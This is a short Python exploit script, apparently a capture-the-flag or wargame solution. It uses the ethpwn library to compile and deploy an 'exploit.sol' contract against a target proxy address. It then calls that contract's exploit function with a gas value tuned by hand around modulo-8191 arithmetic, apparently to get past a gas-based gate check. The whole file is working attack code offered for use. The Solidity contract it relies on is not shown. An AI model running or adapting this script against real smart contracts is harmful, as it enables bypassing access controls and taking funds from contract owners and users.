#!/usr/bin/env python3

from ethpwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('proxy_addr', type=str)
ARGS = parser.parse_args()

context.log_level = 'DEBUG'

CONTRACT_METADATA.compile_solidity_files(['./exploit.sol'])

# (+2) if the gas is returned as if the instruction had already executed
gas_consumed_by_gas_instruction = (78936-41780) + 2

too_much = gas_consumed_by_gas_instruction % 8191
full_gas = 78936 + (8191 - too_much) + 103 + 3 + (8191 - 0x167e)+38+1

with CONTRACT_METADATA['Exploit'].deploy_destructible(ARGS.proxy_addr) as (tx_hash, target):
    transact(target.functions.exploit(), gas=full_gas, force=True)
